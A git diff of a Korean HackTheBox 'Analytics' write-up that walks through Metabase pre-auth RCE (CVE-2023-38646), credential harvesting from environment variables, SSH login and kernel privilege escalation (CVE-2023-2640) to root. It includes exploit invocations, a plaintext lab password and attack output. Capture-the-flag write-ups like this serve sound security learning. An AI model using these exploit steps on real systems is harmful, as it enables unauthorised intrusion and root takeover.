@@ -1,7 +1,7 @@
 ---
 title: HTB Analytics Write-up
 categories: [HackTheBox, Machines]
-tags: [HackTheBox]
+tags: [HackTheBox, cve, metabase]
 image:
     path: /assets/image_post/20240329134348.png
 ---
@@ -88,7 +88,7 @@ Finished
 
 ## [0x01] gainning access
 ---
-관련된 cve를 검색해보니 cve-2023-38646 Pre-Auth RCE 취약점이 나온다. [PoC Code](https://github.com/m3m0o/metabase-pre-auth-rce-poc)를 다운로드하여 한번 실행해보자. 사용 방법은 `python3 main.py -u http://[targeturl] -t [setup-token] -c "[command]"`와 같은 령태이다. 
+관련된 cve를 검색해보니 cve-2023-38646 Pre-Auth RCE 취약점이 나온다. [PoC Code](https://github.com/m3m0o/metabase-pre-auth-rce-poc)를 다운로드하여 한번 실행해보자. 사용 방법은 `python3 main.py -u http://[targeturl] -t [setup-token] -c "[command]"`와 같은 령태이다. setup-token의 경우 `/api/session/properties`를 확인하면 된다.
 
 ``` bash
 ┌──(root㉿kali)-[/home/user/htb/metabase-pre-auth-rce-poc]
@@ -135,3 +135,111 @@ PID   USER     TIME  COMMAND
   119 metabase  0:00 sh -i
   128 metabase  0:00 ps -ef
 ```
+
+export를 통해 어떤 환경변수가 있는지 출력해보니 주요한 내용이 존재한다.
+```
+$ export
+export FC_LANG='en-US'
+export HOME='/home/metabase'
+export HOSTNAME='7b3da3c2d349'
+export JAVA_HOME='/opt/java/openjdk'
+export JAVA_VERSION='jdk-11.0.19+7'
+export LANG='en_US.UTF-8'
+export LANGUAGE='en_US:en'
+export LC_ALL='en_US.UTF-8'
+export LC_CTYPE='en_US.UTF-8'
+export LD_LIBRARY_PATH='/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib'
+export LOGNAME='metabase'
+export MB_DB_CONNECTION_URI=''
+export MB_DB_FILE='//metabase.db/metabase.db'
+export MB_DB_PASS=''
+export MB_DB_USER=''
+export MB_EMAIL_SMTP_PASSWORD=''
+export MB_EMAIL_SMTP_USERNAME=''
+export MB_JETTY_HOST='0.0.0.0'
+export MB_LDAP_BIND_DN=''
+export MB_LDAP_PASSWORD=''
+export META_PASS='An4lytics_ds20223#'
+export META_USER='metalytics'
+export OLDPWD='/'
+export PATH='/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
+export PWD='/metabase.db'
+export SHELL='/bin/sh
+```
+
+획득한 계정 정보를 갖고 ssh로 로그인 시 성공적으로 로그인 된다.
+``` bash
+┌──(root㉿kali)-[/home/user/htb/metabase-pre-auth-rce-poc]
+└─# ssh metalytics@10.10.11.233
+metalytics@10.10.11.233's password:
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)
+
+metalytics@analytics:~$ ls
+user.txt
+metalytics@analytics:~$ cat user.txt
+```
+
+이후 linpeas.sh로 정보를 수집해보았더니 흥미로운 문구가 보인다. sudo 부분에 버전이 취약한지 확인해보라는 것이다.
+``` bash
+                      ╔════════════════════════════════════╗
+══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
+                      ╚════════════════════════════════════╝
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+-rwsr-xr-x 1 root root 40K Nov 24  2022 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 71K Nov 24  2022 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 55K Feb 21  2022 /usr/bin/su
+-rwsr-xr-x 1 root root 35K Feb 21  2022 /usr/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 44K Nov 24  2022 /usr/bin/chsh
+-rwsr-xr-x 1 root root 35K Mar 23  2022 /usr/bin/fusermount3
+-rwsr-xr-x 1 root root 227K Apr  3  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root root 59K Nov 24  2022 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 47K Feb 21  2022 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 72K Nov 24  2022 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-- 1 root messagebus 35K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+```
+
+sudo의 버전을 확인해보니 1.9.9라고 나온다. 관련 키워드로 검색해보니 [CVE-2023-22809](https://github.com/n3m1sys/CVE-2023-22809-sudoedit-privesc/tree/main) 자료가 나온다
+``` bash
+metalytics@analytics:~$ sudo --version
+Sudo version 1.9.9
+Sudoers policy plugin version 1.9.9
+Sudoers file grammar version 48
+Sudoers I/O plugin version 1.9.9
+Sudoers audit plugin version 1.9.9
+```
+
+실제 공격을 진행해보았으나, metalytics 계정으로는 진행할 수 없다고 나온다....🤢
+``` bash
+metalytics@analytics:~$ ./cve-2023-22809.sh
+[sudo] password for metalytics:
+Sorry, user metalytics may not run sudo on localhost.
+> It doesn't seem that this user can run sudoedit as root
+Do you want to proceed anyway? (y/N): y
+> Opening sudoers file, please add the following line to the file in order to do the privesc:
+metalytics ALL=(ALL:ALL) ALL
+Press any key to continue...[sudo] password for metalytics:
+metalytics is not in the sudoers file.  This incident will be reported.
+```
+
+결국 공략을 보았고, 커널 버전과 관련된 취약점을 찾아야한다는 것을 알았다. `6.2.0-25-generic #25~22.04.2-Ubuntu cve`로 검색하면 [cve-2023-2640](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/tree/main) 취약점 관련 내용이 나온다.
+``` bash
+metalytics@analytics:~$ uname -a
+Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+바로 root를 획득할 수 있다.
+``` bash
+metalytics@analytics:~$ chmod +x cve-2023-2640.sh
+metalytics@analytics:~$ ./cve-2023-2640.sh
+[+] You should be root now
+[+] Type 'exit' to finish and leave the house cleaned
+root@analytics:~# whoami
+root
+root@analytics:~# cat /root/root.txt
+```
+
+## [0x03] conclusion
+---
+이번문제는 cve와 관련된 내용을 찾는 것이 중점이였다. cve로 시스템을 장악하는 경우는 많이 접해보지 않아 낯선 접근 방법이였다. 커널 취약점으로 인한 root 획득이라니...다양한 문제를 풀어봐야할듯 하다.
+![](../assets/image_post/20240403114535.png)
